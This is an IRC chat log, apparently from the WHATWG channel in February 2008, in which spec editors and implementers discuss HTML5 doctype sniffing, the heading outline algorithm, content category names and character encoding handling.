svl: Firefox is a registered trademark of the Mozilla Foundation, and its use is massively limited

[10:32:00.0000] <gavin>
"massively limited"? limited to "Firefox", sure :)

[10:37:00.0000] <gsnedders>
gavin: limited to any official build

[10:37:01.0000] <zcorpan>
Philip`: i think the regular expression could have been <!doctype[^>]*>

[10:39:00.0000] <gsnedders>
Philip`: seems to have been merged into trunk by now

[10:40:00.0000] <zcorpan>
 <!doctype html public "-//sq//dtd html 2.0 + all extensions//en" "hmpro3.dtd">

[10:40:01.0000] <zcorpan>
hmm

[10:43:00.0000] <gsnedders>
Philip`: only diff in WebKit from HTML 5 is <!doctype html public "-//w3c//dtd html 4.01 transitional//en" ""> is quirks

[10:46:00.0000] <zcorpan>
opera seems to mostly match html5 on commonly used doctypes, but mostly match ie on uncommonly used doctypes

[10:47:00.0000] <zcorpan>
what i want to know is if changing our impl will break pages with the uncommonly used doctypes :)

[10:48:00.0000] <zcorpan>
if they already are broken in safari 3 and firefox, then it might be a good idea to revise html5

[10:49:00.0000] <zcorpan>
(i.e. broken because they get the wrong mode)

[11:28:00.0000] <Philip`>
zcorpan: <!doctype[^>]*> probably would be entirely sensible, given that that's what HTML5 now expects

[11:29:00.0000] <Philip`>
/me will re-run it with that

[11:31:00.0000] <Philip`>
/me saw 39 application/xhtml+xml pages out of 100K (when sending the same Accept header as FF3)

[11:38:00.0000] <Philip`>
gsnedders: Do you mean the 'Test' button thing works correctly in WebKit now, so I don't need to change anything (like copying aroben's suggestion)?

[11:38:01.0000] <gsnedders>
Philip`: yeah

[11:38:02.0000] <Philip`>
gsnedders: Okay, thanks, that makes it easy for me :-)

[11:39:00.0000] <annevk>
http://tc.labs.opera.com/html/parsing/doctype/001.htm also tests DOCTYPE handling

[11:39:01.0000] <annevk>
fwiw

[11:43:00.0000] <Philip`>
/me wonders if he should make each doctype link to a list of all the pages which were found to use it

[12:21:00.0000] <Hixie>
Philip`: how is <!doctype html public "-//"aol hometown//html 3.0 transitional//en"> triggering HTML5 quirks?

[12:24:00.0000] <Philip`>
Hixie: After the second '"' it's in 'after DOCTYPE public identifier state', and the 'a' puts it into 'bogus DOCTYPE state', which ends up setting the correctness flag to 'incorrect', so it gets treated as quirks

[12:28:00.0000] <Hixie>
Philip`: oh, yeah, good point

[12:30:00.0000] <Philip`>
Oh, I just realised why my downloader was failing to terminate for one particular site

[12:30:01.0000] <Philip`>
That site is an infinitely long radio stream

[12:31:00.0000] <Hixie>
hah

[12:31:01.0000] <Hixie>
yeah

[12:31:02.0000] <Hixie>
i've come across infinite pages before too

[12:31:03.0000] <Hixie>
that's how i know there's an infinite number of <font> elements on the web

[12:32:00.0000] <gsnedders>
:D

[12:44:00.0000] <Philip`>
Why has my /bin/grep become thousands of times slower than it should be?

[12:47:00.0000] <Philip`>
and only on my XML file of extracted doctypes, not on any other file I've tested?

[12:48:00.0000] <Philip`>
Oh, it goes thousands of times faster again if I set LANG=en_GB without the .UTF-8

[12:50:00.0000] <Philip`>
even though it's perfectly fast on a different computer with LANG=en_GB.UTF-8

[12:51:00.0000] <gsnedders>
computers are odd.

[12:55:00.0000] <Dashiva>
Probably has to do with matching stuff like \w

[12:57:00.0000] <Philip`>
I was only doing "grep processed foo.xml"

[13:00:00.0000] <Dashiva>
Maybe it does some conversion to an internal representation or some other premature optimization anyway?

[13:01:00.0000] <Philip`>
<!DOCTYPE "="&quot;" PUBLIC="PUBLIC" HTML="html" HTTP://WWW.W3.ORG/TR/XHTML1/DTD/XHTML1-STRICT.DTD="http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd" 1.0="1.0" -//W3C//DTD="-//W3C//DTD" STRICT//EN="Strict//EN"

[13:01:01.0000] <Philip`>
="

[13:01:02.0000] <Philip`>
" XHTML="XHTML">

[13:01:03.0000] <Philip`>
Hmm, I can guess how that happened

[13:03:00.0000] <Dashiva>
haha

[13:04:00.0000] <Hixie>
wow, what a mess

[13:04:01.0000] <Dashiva>
Whitespace is our friend, right?

[13:13:00.0000] <Hixie>
hsivonen: re your request for rewriting the outlining algorithm

[13:13:01.0000] <Hixie>
you say

[13:13:02.0000] <Hixie>
> This sweep should probably define what checkpoint data to

[13:13:03.0000] <Hixie>
> store on each element that implements the HTMLHeaderElement interface to allow

[13:13:04.0000] <Hixie>
> local recomputation.

[13:14:00.0000] <Hixie>
can't i just say what i usually say, namely that at any time, the outline must match the results you would get from running the algorithm over the whole tree?

[13:14:01.0000] <Hixie>
i don't want to be the one defining how you are to do optimisations...

[13:15:00.0000] <hsivonen>
Hixie: does stating that actually make the said optimization reasonably implementable?

[13:15:01.0000] <Hixie>
depends what the algorithm is

[13:16:00.0000] <Philip`>
http://philip.html5.org/data/doctypes-2.html#%3C!doctype_html%3E - now with links to pages, at least for the obscurer doctypes

[13:17:00.0000] <hsivonen>
Hixie: I don't see how it would hurt to define the outline in terms of forward sweeps from a hn state

[13:17:01.0000] <Hixie>
oh it wouldn't, and that's just a subset of defining it as part of a forward sweep in general

[13:17:02.0000] <Hixie>
i'm just saying the spec shouldn't define ny algorithm twice

[13:17:03.0000] <Hixie>
since the spec shouldn't be optimising

[13:18:00.0000] <Hixie>
or rather, it should be optimising for lack of ambiguity

[13:18:01.0000] <Hixie>
and adding two algorithms defeats that :-)

[13:18:02.0000] <gsnedders>
the current section confuses me

[13:18:03.0000] <Hixie>
hmm... i guess each sectioning element is effectively atomic in the algorithm...

[13:18:04.0000] <Hixie>
that is, anything outside a section can't affect what's inside it

[13:18:05.0000] <Hixie>
and what's inside a section can only affect the relative position of further nested sections...

[13:19:00.0000] <Hixie>
that's useful

[13:19:01.0000] <hsivonen>
Hixie: surely a forward sweep algorith can be the only definition

[13:19:02.0000] <Hixie>
hsivonen: yes

[13:19:03.0000] <Hixie>
hsivonen: that's what i plan to do

[13:19:04.0000] <hsivonen>
Hixie: excellent. thanks

[13:20:00.0000] <Hixie>
but your e-mail asked for one or two other things too, which i'm not sure i should necessarily do

[13:20:01.0000] <Hixie>
actually i think what i quoted above is a non-issue, and your second requirement might already be met


2008-02-27
[16:16:00.0000] <Hixie>
ok

[16:16:01.0000] <Hixie>
<blockquote> is clearly not a sectioning element

[16:18:00.0000] <Hixie>
and outlines will not include headers in tables, figures, blockquotes, or datagrids.

[17:27:00.0000] <Hixie>
oh lord, my legacy lives on http://oxine.opera.com/documentation/dom-interface.html

[17:42:00.0000] <kingryan>
long live legacy!

[17:43:00.0000] <Philip`>
whether you want it to or not

[18:24:00.0000] <Hixie>
hsivonen: ok. so. tell me if the new algorithm is better.

[18:24:01.0000] <Hixie>
jgraham_: your input would be especially interesting too, since you implemented the last version :-)

[18:46:00.0000] <annevk>
Hixie, do you have a rough plan of what you're going to edit in the spec?

[18:48:00.0000] <Hixie>
how do you mean?

[18:50:00.0000] <annevk>
If you had some plan which sections of the specification you're going to work on for the next month or so. I guess I'm mostly interested in when the parsing section gets another update.

[18:50:01.0000] <Hixie>
no particular plan.

[18:50:02.0000] <Hixie>
i can start on parsing next if you want.

[18:53:00.0000] <annevk>
Cool. In particular I'm interested in seeing insertion modes being replaced with phases and updates to DOCTYPE sniffing.

[18:53:01.0000] <Hixie>
yeah

[18:53:02.0000] <Hixie>
that scares me

[22:04:00.0000] <takkaria>
Hixie: how do you twittr the svn commits with whatwg?  I want to copy it for one of my projects

[22:56:00.0000] <Hixie>
takkaria: send me mail, i'll send you the script

[23:05:00.0000] <takkaria>
Hixie: ta

[23:07:00.0000] <takkaria>
sent

[23:13:00.0000] <Hixie>
ok, sections are updated. e-mail sent.

[00:42:00.0000] <Lachy>
Can anyone explain the logic behind the suggestion to use <dl> for marking up poetry? Even the wiki page with the example seems to have no real explanation

[00:47:00.0000] <virtuelv>
seems bizarre

[00:48:00.0000] <Lachy>
it seems that some people, when determining what kind of elements are "prose content" just look at those that say "prose content" in the category list, and fail to look at the definition of prose content

[00:48:01.0000] <virtuelv>
IMO, poetry is a bad match for examples

[00:48:02.0000] <Lachy>
the heirarchy of categories should be made clearer somehow

[00:48:03.0000] <virtuelv>
there is poetry where whitespace is extremely significant

[00:48:04.0000] <Lachy>
for that, we have <pre>

[00:49:00.0000] <virtuelv>
yes

[00:49:01.0000] <virtuelv>
my point is just that using a poem in examples, or suggesting anything particular for poems is bound to fail and cause misunderstandings

[01:39:00.0000] <Hixie>
prose content is a terrible name

[01:39:01.0000] <Hixie>
i really should fine something better

[01:41:00.0000] <Hixie>
also "grouping content" and "text-level semantics" are terrible section names

[01:59:00.0000] <jgraham_>
Hixie: I'll try to look at the heading outline stuff in a bit of detail soon

[01:59:01.0000] <jgraham_>
/me is, in general, quite busy at the moment

[01:59:02.0000] <Hixie>
cool

[02:00:00.0000] <Hixie>
would be good to compare the new algorithm with the old one

[02:00:01.0000] <Hixie>
see if the same outlines come out

[02:00:02.0000] <Hixie>
they basically should

[02:00:03.0000] <Hixie>
though iirc there are some minor intentional differences, in edge cases with invalid markup in particular

[02:01:00.0000] <Hixie>
also <address> elements will get associated with anonymous sections now, not their DOM parent node <section> if that is a different section

[02:01:01.0000] <jgraham_>
Also, I'm glad you're still optimistic about FF3 having sane behaviour for unknown elements :)

[02:02:00.0000] <Hixie>
well they keep saying they'll try something

[02:02:01.0000] <Hixie>
they haven't given up yet

[02:03:00.0000] <Hixie>
we _really_ need new names for "prose content", "grouping content", and "text-level semantics"

[02:05:00.0000] <Hixie>
Maybe Flements, Bloments, and Inments.

[02:05:01.0000] <Hixie>
that would at least not confuse people into thinking they meant something else

[02:07:00.0000] <Hixie>
or Flodes, Grements, and Liliments

[02:07:01.0000] <annevk>
alpha beta and gamma

[02:08:00.0000] <Hixie>
the advantage of a made up word is that it fits well in the flow of text

[02:08:01.0000] <Hixie>
"<p> is a flode element"

[02:08:02.0000] <Hixie>
maybe "prose content" should be "flow content"

[02:09:00.0000] <Philip`>
You could have a <p> start flag

[02:09:01.0000] <Lachy>
flow content would work, since that's bascially the equivalent in HTML4

[02:10:00.0000] <jgraham_>
I suggest not using flow content for the same reason :)

[02:13:00.0000] <Hixie>
ok flow content it is

[02:14:00.0000] <annevk>
did someone look at how XHTML2 solved this?

[02:14:01.0000] <jgraham_>
Does it exactly match the HTML 4 definition?

[02:15:00.0000] <annevk>
XHTML2 has modules

[02:15:01.0000] <annevk>
"XHTML Text Module"

[02:15:02.0000] <Hixie>
you're assuming xhtml2 solved it

[02:16:00.0000] <annevk>
s/solved/did/

[02:16:01.0000] <Hixie>
well, they don't have the same concepts we do

[02:16:02.0000] <Hixie>
they don't have flow < phrasing < embedded, e.g.

[02:39:00.0000] <hsivonen>
hmm. it would be great to have a script that'd file a v.nu bug every time the spec svn commit message is marked as conformance-checker-relevant

[02:40:00.0000] <annevk>
at some point the tracker should support Atom with categories or something which might make that easy

[07:42:00.0000] <zcorpan>
Hixie: making <td> a sectioning root will make the outline algorithm useless for real-world pages where tables are used for layout

[07:43:00.0000] <zcorpan>
(unless it can be determindated which tables are used for layout and let those be ignored from the rule)

[07:47:00.0000] <zcorpan>
(however, i don't know when you'd have sections in <td> unless you were using a layout table, so perhaps <td> simply should not be a sectioning root)

[08:03:00.0000] <zcorpan>
Hixie: while you're renaming stuff, i think "text-level content" makes more sense than "phrasing content"

[08:07:00.0000] <zcorpan>
Hixie: html4 described inline as "text-level", and html4 has "phrase elements" (em, strong, dfn, etc)

[08:11:00.0000] <gsnedders>
Hixie: why do we have "current outlinee" with two "e"s?

[08:24:00.0000] <gsnedders>
Hixie: more nitpicking: steps one and two of creating an outline are wrong: they don't hold it yet

[09:06:00.0000] <annevk>
hmm, ES4 uses a namespace with a version number in it...

[09:32:00.0000] <Philip`>
/me sees that 15% of Alexa Top 500 pages are in HTML5 non-quirks mode, compared to 5% of dmoz.org pages

[09:33:00.0000] <Philip`>
(and 47% limited-quirks, vs 23%)

[09:33:01.0000] <gsnedders>
Philip`: and strict v. non-strict?

[09:34:00.0000] <Philip`>
(and 37% quirks, vs 72%)

[09:34:01.0000] <Philip`>
(and I hope those numbers add up right)

[09:35:00.0000] <Camaban>
I imagine dmoz has a lot more 'older' sites

[09:36:00.0000] <Philip`>
gsnedders: I'm not sure how to measure that exactly

[09:39:00.0000] <Philip`>
though if I simply count the top XHTML1.0-Strict and HTML4-Strict and XHTML1.1 doctypes, then that's 14% of Alexa and 4% of dmoz

[10:02:00.0000] <Philip`>
http://philip.html5.org/data/doctypes.html | http://philip.html5.org/data/doctypes-alexa.html

[10:05:00.0000] <Philip`>
http://philip.html5.org/data/doctypes-alexa.html#%3c%21doctype_html_public_%22-%2f%2fw3c%2f%2fdtd_html_4.01%2f%2fen%22_%22http%3a%2f%2fwww.w3.org%2ftr%2fhtml4%2fstrict.dtd%22_%2f%3e - HTML5 disagrees with Firefox and IE, which maybe isn't good

[10:06:00.0000] <Philip`>
(and Opera)

[10:11:00.0000] <zcorpan>
Philip`: thanks for providing links to the pages that have a given doctype

[10:12:00.0000] <Philip`>
zcorpan: I hope it doesn't matter that I skipped links for the more popular ones - they just made the page unreasonably huge

[10:12:01.0000] <Philip`>
(It's currently ~1.5MB, or 150KB with gzip, which is not entirely as small as one might wish)

[10:13:00.0000] <zcorpan>
Philip`: that's fine, i wanted to analyse the less common doctypes :)

[10:13:01.0000] <zcorpan>
since we're already more aligned with html5 than with ie on the commonly used doctypes

[11:08:00.0000] <Hixie>
zcorpan: yes, that was the entire point of making <td> a sectioning root. Also, I couldn't work out what order to make the headers go in, and I figured that in a _conforming_ case of a table with subsections (e.g. a character sheet where one of the cells is a character backstory), you wouldn't actually want them on the main outline.

[11:09:00.0000] <Hixie>
zcorpan: phrasing content can't be text-level content because phrasing content includes non-text things like <img> and <video>.

[11:09:01.0000] <Hixie>
gsnedders: "current outlinee" is correct (it's the thing being outlined)

[11:26:00.0000] <zcorpan>
Hixie: text-level means that it's on the same level as text, not that it is text

[11:26:01.0000] <Hixie>
yeah but i think that's confusing

[11:27:00.0000] <zcorpan>
i think phrasing is more confusing :)

[11:27:01.0000] <Hixie>
though possibly no more confusing than what we have now, indeed

[11:36:00.0000] <zcorpan>
Hixie: did you mean that the point of making <td> section root was to make the algorithm useless for real-world pages?

[11:37:00.0000] <Hixie>
well maybe saying it was the whole point was overstating the case a bit

[11:37:01.0000] <zcorpan>
ok

[11:37:02.0000] <Hixie>
on a compliant page that happens to use headers in tables, you'd not want those headers in the outline

[11:37:03.0000] <Hixie>
just like headers in a figure or in a blockquote, they are like a "subdocument"

[11:38:00.0000] <Hixie>
now, it does mean that outlines don't work in abusive pages, but i'm not shedding any tears over this

[11:38:01.0000] <zcorpan>
implementors that make outlines probably already know how to spot a layout table, so they could easily exclude those tables

[11:40:00.0000] <Hixie>
yeah

[11:40:01.0000] <Hixie>
maybe a quirks mode thing :-)

[11:40:02.0000] <zcorpan>
tables are used for layout in standards mode too in the wild

[11:40:03.0000] <Hixie>
yeah

[11:50:00.0000] <gsnedders>
Hixie: peh. that's confusing.

[11:51:00.0000] <Hixie>
significantly better ideas welcome :-)

[11:54:00.0000] <gsnedders>
"current thing being outlined" :P

[12:01:00.0000] <zcorpan>
Hixie: "authors are encouraged to place at most one top-level heading in each sectioning element" or some such... but perhaps that's not accurate enough or not understandable

[12:06:00.0000] <Hixie>
yeah

[12:06:01.0000] <Hixie>
but then again, that's what the current encouragemenet basically proposes

[12:11:00.0000] <zcorpan>
that's true

[12:42:00.0000] <gsnedders>
Hixie: what's a character not defined by unicode? from the document conformance section, it seems that not all non-characters are

[12:42:01.0000] <Hixie>
yeah, but some of them are defined to be permanently undefined

[12:42:02.0000] <Hixie>
whereas others are merely not yet defined

[12:43:00.0000] <gsnedders>
oh, wait.

[12:43:01.0000] <gsnedders>
I realise what I'm mistaking.

[12:43:02.0000] <Hixie>
i'm so sorry for anne. he's somehow ended up editing a spec with multiple phone calls per week trying to tell him what the spec should say

[12:43:03.0000] <Hixie>
sure am glad i dumped xmlhttprequest now though :-D

[12:44:00.0000] <gsnedders>
xxFFFE is the only code point that's always a non-character, as FDD0 to FDEF are only exactly that

[12:44:01.0000] <gsnedders>
that's what confused me

[12:44:02.0000] <Hixie>
eh?

[12:44:03.0000] <Hixie>
there are lots of non-character characters

[12:44:04.0000] <Hixie>
FFFF

[12:44:05.0000] <Hixie>
FFFE

[12:44:06.0000] <Hixie>
U+03FFFE

[12:44:07.0000] <Hixie>
etc

[12:44:08.0000] <Hixie>
see the list i just put in the spec, in fact :-)

[12:45:00.0000] <gsnedders>
I thought it was wrong, that's the only point :)

[12:45:01.0000] <Hixie>
ok :-)

[12:45:02.0000] <gsnedders>
but as I said, I'm being silly

[12:45:03.0000] <Hixie>
well i just copied it from xml 1.0

[12:45:04.0000] <Hixie>
so...

[12:45:05.0000] <gsnedders>
I think FFFF is legal

[12:46:00.0000] <Hixie>
it's not

[12:46:01.0000] <gsnedders>
"Noncharacters consist of the values U+nFFFE and 

[12:46:02.0000] <gsnedders>
U+nFFFF (where n is from 0 to 1016) and the values U+FDD0..U+FDEF. 

[12:46:03.0000] <gsnedders>
"

[12:46:04.0000] <gsnedders>
OK, I'm wrong again (and so is my implementation, then)

[12:46:05.0000] <gsnedders>
/me realises his implementation is just too smart for himself

[12:46:06.0000] <gsnedders>
my implementation _is_ right.

[12:47:00.0000] <gsnedders>
`($codepoint & 0xFFFE) === 0xFFFE` does match FFFF

[12:48:00.0000] <Hixie>
or rather, it does match it

[12:48:01.0000] <Hixie>
but yes

[12:48:02.0000] <Hixie>
that's a fine check

[12:48:03.0000] <gsnedders>
If you aren't too tired to misread it :)

[12:48:04.0000] <gsnedders>
(that's from my PHP impl., FWIW)

[12:49:00.0000] <gsnedders>
Or rather, It only is if you aren't too tired to understand it

[12:49:01.0000] <gsnedders>
ergh.

[12:49:02.0000] <gsnedders>
I can't even do English :)

[12:49:03.0000] <gsnedders>
/me gives up, and shuts up

[12:54:00.0000] <Hixie>
knowing when to shut up is a good skill to have :-)

[12:54:01.0000] <gsnedders>
Hixie: I would rather the bit about when to throw a parse error to be clearer. Surrogates _are_ defined by Unicode (they just have no character assignments), for example

[12:54:02.0000] <Hixie>
there are no surrogate characters

[12:54:03.0000] <Hixie>
unless i'm misunderstanding you

[12:54:04.0000] <Hixie>
what is unclear about the spec?

[12:55:00.0000] <gsnedders>
ah. true. if you take it of the actual meaning of character, yeah.

[12:55:01.0000] <gsnedders>
/me was thinking of a character as being any code-point, but of course with non-characters that's dumb

[12:55:02.0000] <gsnedders>
/me shuts up, again

[12:56:00.0000] <Hixie>
U+.... is the character, not the value as it was in the original byte stream

[12:56:01.0000] <Hixie>
so if you are decoding as UTF-16, you can never end up seeing a U+.... character from the surrogate blocks

[12:56:02.0000] <gsnedders>
yeah, that's true

[12:56:03.0000] <gsnedders>
/me needs to wake up

[12:56:04.0000] <Hixie>
and if you do it as UTF-8, and you see one of those characters, it's not actually a surrogate character, it's a non-character

[12:56:05.0000] <gsnedders>
(or, alternatively, just go to bed)

[12:56:06.0000] <Hixie>
but anyway

[12:57:00.0000] <Hixie>
where is the part fo the spec that says not to put encoding declarations in the file?

[12:57:01.0000] <Hixie>
/me can't find it

[12:57:02.0000] <gsnedders>
/me didn't know the spec said that

[12:57:03.0000] <Hixie>
apparently people want me to remove it

[12:57:04.0000] <Hixie>
which i'm fine with

[12:57:05.0000] <Hixie>
but i can't find it...

[12:58:00.0000] <gsnedders>
latest revision to the spec could cause some documents to cause a heckuva lot of parse error, me thinks. but people manage to create a heckuva lot of parse errors anyway.

[12:59:00.0000] <Philip`>
Hixie: s/occurances/occurrences/ in a recent edit

[12:59:01.0000] <Hixie>
hate that word

[12:59:02.0000] <Hixie>
thanks

[13:00:00.0000] <kingryan>
Hixie: by "encoding declarations in the file", could people be referring to "<meta http-equiv="content-type" content="text/html; charset=utf-8" />

[13:00:01.0000] <kingryan>
" ?

[13:00:02.0000] <Hixie>
kingryan: yes

[13:00:03.0000] <gsnedders>
on the subject of English, how is the spec both en-gb-x-hixie and en-us-x-hixie at once?

[13:00:04.0000] <Hixie>
gsnedders: it's mostly -us-, i just haven't fixed the declarations yet

[13:00:05.0000] <Hixie>
they're in a different file

[13:00:06.0000] <kingryan>
are people confusing that being allowed with that being required?

[13:01:00.0000] <Hixie>
kingryan: no, i'm pretty sure i once wrote that people should use Content-Type headers instead

[13:01:01.0000] <Hixie>
but i can't find it anymore

[13:02:00.0000] <Hixie>
well, can't find it

[13:02:01.0000] <Hixie>
oh well

[13:32:00.0000] <annevk>
woha, multimousewheel is gone again?

[13:32:01.0000] <annevk>
hmm

[13:32:02.0000] <annevk>
i wonder if they thought everything through, such as mousewheel not firing for certain types of scrolling currently

[13:33:00.0000] <Hixie>
i doubt it

[13:33:01.0000] <Hixie>
who's editing that spec?

[13:33:02.0000] <Hixie>
do they have any browser, qa, and spec review exerience?

[13:35:00.0000] <annevk>
dunno

[13:35:01.0000] <annevk>
well, the spec is edited by Andrew Emmons I believe

[13:35:02.0000] <Hixie>
don't know who that is

[13:36:00.0000] <annevk>
from BitFlash

[13:36:01.0000] <Hixie>
never heard of it

[13:36:02.0000] <annevk>
i don't know him either

[13:36:03.0000] <Hixie>
well, we'll see

[13:36:04.0000] <Hixie>
there really should be a way to train spec writers

[13:36:05.0000] <Hixie>
maybe i should write a book or something

[13:39:00.0000] <annevk>
"HOWTO BE A HIXIE"

[13:45:00.0000] <gsnedders>
1) Start a cabal that everyone hates.

[13:45:01.0000] <gsnedders>
2) ???

[13:45:02.0000] <gsnedders>
3) Profit!

[13:46:00.0000] <jgraham>
Spec writing for Dummies

[13:47:00.0000] <gsnedders>
/me realises in another virtual desktop he started a LaTeX file containing "\chapter{Evaluation}" hours ago.

[13:48:00.0000] <gsnedders>
/me has been doing well at procrastinating today

[13:48:01.0000] <gsnedders>
Philip`: I've just got an email from <mtanalin⊙yr> too

[13:49:00.0000] <jgraham>
gsnedders, Philip`: I get those 

[13:50:00.0000] <jgraham>
Hixie: re the text "The outline for a sectioning content element or a sectioning root element consists of a list of one or more potentially nested sections. Each section can have zero or one heading associated with it. The algorithm for the outline also associates each node in the DOM tree with a particular section and potentially a heading."

[13:51:00.0000] <jgraham>
The "sections" referred to here are need not be actual <section> elements or anything, I assume. This could be more clear

[13:57:00.0000] <Hixie>
jgraham: clarified.

[13:57:01.0000] <Hixie>
(should be regenned in about 20 seconds)

[13:58:00.0000] <gsnedders>
/me needs less coursework and more spec-gen clone

[14:07:00.0000] <annevk>
gsnedders, now you make me go looking

[14:12:00.0000] <Hixie>
does anyone actually use ISO-8859-11 ?

[14:13:00.0000] <annevk>
that's off-topic

[14:14:00.0000] <Hixie>
well i have feedback here saying i should make -11 turn into win874

[14:14:01.0000] <Hixie>
and i have no idea if it matters or not

[14:14:02.0000] <Hixie>
safari doesn't even support -11

[14:14:03.0000] <Hixie>
(it does support 874)

[14:16:00.0000] <annevk>
given that 874 is supported and that other browsers do "support" -11 and that mapping is cheap...

[14:19:00.0000] <dbaron>
Hrm.  Hixie's subject lines don't work very well when you have limited horizontal space for subjects.  He's always writing "Re: [whatwg] several messages about"

[14:20:00.0000] <annevk>
"Make using a Win1252-specific byte when the document declared as ISO-8859-1 be a parse error." is that really worth it?

[14:20:01.0000] <dbaron>
Hixie, and if you're not aware, you should check mozilla/intl/uconv/src/charsetalias.properties for Mozilla's behavior

[14:20:02.0000] <annevk>
/me thinks ISO-8859-1 should be an alias for the former

[14:21:00.0000] <dbaron>
Mozilla seems to treat windows-874 and iso-8859-11 separately

[14:22:00.0000] <dbaron>
Hixie, er, actually, that's not the case

[14:22:01.0000] <dbaron>
but somebody decided to do that particular mapping in C++ instead

[14:22:02.0000] <dbaron>
so we treatt iso-8859-11 as windows-874, per bug 127755

[14:31:00.0000] <Hixie>
dbaron: yeah

[14:32:00.0000] <Hixie>
annevk: adding more complications isn't cheap

[14:32:01.0000] <Hixie>
annevk: they add up

[14:32:02.0000] <annevk>
it's a simply hashtable entry

[14:33:00.0000] <annevk>
"iso-8859-1" : "windows-1252", "iso-8859-11" : "windows-874", ...

[14:33:01.0000] <Hixie>
no, it

[14:33:02.0000] <Hixie>
is far more than that

[14:33:03.0000] <Hixie>
not in code

[14:33:04.0000] <Hixie>
but in cost

[14:34:00.0000] <Hixie>
it further antagonises the tag, for instance

[14:34:01.0000] <Hixie>
it makes QA more complex

[14:34:02.0000] <Hixie>
it makes people who try to use ISO-8859-11 wonder why they're getting od results

[14:34:03.0000] <Hixie>
etc

[14:34:04.0000] <Hixie>
it makes people say the spec is complicated

[14:35:00.0000] <annevk>
ideally this would not be solved at the HTML5 level though

[14:35:01.0000] <annevk>
IANA already has synonyms for charsets

[14:35:02.0000] <annevk>
they could simply make iso-8859-1 a synomym and likewise for its friends

[14:36:00.0000] <Hixie>
well, if you can convince them of that, let me know

[14:37:00.0000] <annevk>
I don't think I'm old enough to deal with what seems to be a political mayhem

[14:38:00.0000] <annevk>
I guess at some point it might be worth trying to fix it...

[14:38:01.0000] <Hixie>
neither am i :-)

[14:39:00.0000] <Hixie>
gsnedders: so do i still need to deal with this doctype feedback or is anne's comment enough?

[14:39:01.0000] <annevk>
http://lists.w3.org/Archives/Public/public-forms/2008Feb/att-0080/2008-02-27.html#topic4

[14:41:00.0000] <Philip`>
/me sees no iso-8859-1 in his 125K pages, and 61 windows-874s

[14:41:01.0000] <annevk>
iso-8859-1 or iso-8859-11 ?

[14:42:00.0000] <Philip`>
Uh

[14:42:01.0000] <Philip`>
-11

[14:42:02.0000] <Hixie>
HAHAHAHAHAHAHAHA

[14:42:03.0000] <Hixie>
anne: boy i hope that was a minuting error

[14:43:00.0000] <Philip`>
(except as a substring in http://www.btfonsterteknik.com/ )

[14:43:01.0000] <Hixie>
Philip`: cool, thanks

[14:43:02.0000] <Hixie>
i guess i should do a bigger scan

[14:43:03.0000] <Hixie>
and see what that tells us

[14:43:04.0000] <SadEagle>
Philip`: if it's not any effort to compute, what about 8859-5?

[14:44:00.0000] <annevk>
Hixie, yeah... :)

[14:44:01.0000] <annevk>
Philip`, and while you're at it, how about some stats? :)

[14:44:02.0000] <annevk>
(on charsets in general)

[14:45:00.0000] <Philip`>
SadEagle: That wouldn't be any effort, though it'll take a short while while I send grep through 3GB of HTML again :-)

[14:45:01.0000] <Hixie>
Philip`: you should set up a hadoop cluster for yourself :-)

[14:46:00.0000] <Philip`>
annevk: I suppose I could just collect all the HTTP content-type and meta content-types and summarise that

[14:47:00.0000] <Philip`>
Hixie: I only have about one machine so it wouldn't be a very good cluster, and it'd be fast enough by itself if it wasn't part of someone else's tiny cluster that's running an automated theorem prover several million times and using up all the CPU time :-)

[14:47:01.0000] <annevk>
nice nice

[14:50:00.0000] <gsnedders>
Hixie: having it clearer would always be nice

[14:50:01.0000] <Hixie>
gsnedders: please reply to anne saying what you would suggest to make it clearer then :-) thanks :-)

[14:51:00.0000] <Philip`>
SadEagle: I see about 7 that claim to be iso-8859-5

[14:51:01.0000] <Hixie>
Philip`: hah

[14:52:00.0000] <Hixie>
i guess i should actually implement these character encoding algorithms and use those to work out the encodings, huh

[14:52:01.0000] <annevk>
to be honest, my initial tokenizer implemention did not make the distinction either, but that was quickly rectified when i did the parsing stuff

[14:52:02.0000] <Hixie>
i'll do that after lunch

[14:52:03.0000] <Hixie>
back later

[14:52:04.0000] <annevk>
i still don't like them being non-deterministic

[14:52:05.0000] <annevk>
/me -> the wire


2008-02-28
[16:14:00.0000] <Hixie>
OK!

[16:14:01.0000] <Hixie>
/me flexes fingers

[16:14:02.0000] <Hixie>
character encoding spec, where are you so i can (a) implement you and then (b) fix you good and well.

[16:52:00.0000] <annevk>
I was planning on sleeping, but then I came accross this: http://steinbaugh.com/asides/ems-layout/ "but I’m not planning anything new until HTML 5 or XHTML 2 gets finalized" someone should tell him

[16:52:01.0000] <Hixie>
xhtml2 might be finalised relatively soon

[16:53:00.0000] <Hixie>
so step 3 of the "algorithm for extracting an encoding from a Content-Type" says "If the next six characters are not 'charset', return nothing"

[16:53:01.0000] <Hixie>
anyone know if i meant that to be a case-insensitive check?

[16:54:00.0000] <Philip`>
Hmm, it still says "six"?

[16:55:00.0000] <Hixie>
uh yeah i should fix that while i'm at it

[16:55:01.0000] <Hixie>
but that wasn't the point :-)

[17:03:00.0000] <Philip`>
Lots of people use capital CHARSET so it would be most useful if it was case insensitive

[17:03:01.0000] <Hixie>
good to know

[17:04:00.0000] <Philip`>
Oh, is this for HTTP Content-Type rather than <meta>?

[17:04:01.0000] <Hixie>
it's for "text/html;charset=foo"

[17:04:02.0000] <Hixie>
whether in Content-Type or in <meta content="">

[17:04:03.0000] <Hixie>
(not <meta charset="">)

[17:05:00.0000] <Philip`>
Ah, okay

[17:05:01.0000] <Hixie>
still case-insensitive?

[17:06:00.0000] <Philip`>
In the HTTP header, I see 3 CHARSET, 223 Charset, 25451 charset, but there are far more CHARSETs in <meta>

[17:06:01.0000] <Hixie>
k

[17:06:02.0000] <Hixie>
case-insensitive it is

[17:06:03.0000] <Philip`>
(I don't currently have a nice way of counting contents of <meta> though)

[17:06:04.0000] <Hixie>
i'm setting up a script to parse the docs and find that

[06:00:00.0000] <annevk>
hmm

[06:01:00.0000] <annevk>
is it worth responding to the global href thread?

[06:05:00.0000] <Philip`>
If you have good arguments then it's probably useful to respond and to update the FAQ to be clearer about those points

[06:05:01.0000] <annevk>
dunno

[06:06:00.0000] <annevk>
guess i'll leave it for now

[06:07:00.0000] <annevk>
i think <a> should be allowed to wrap around "block level elements" and i think that adding href everywhere complicates processing models too much for no real benefit

[06:09:00.0000] <annevk>
using script for older user agents is a valid point though

[06:10:00.0000] <Philip`>
Why does it make the processing model any more complicated than it already has to be to handle global onclick and :hover?

[06:13:00.0000] <annevk>
because every element gains an additional default click event handler

[06:14:00.0000] <annevk>
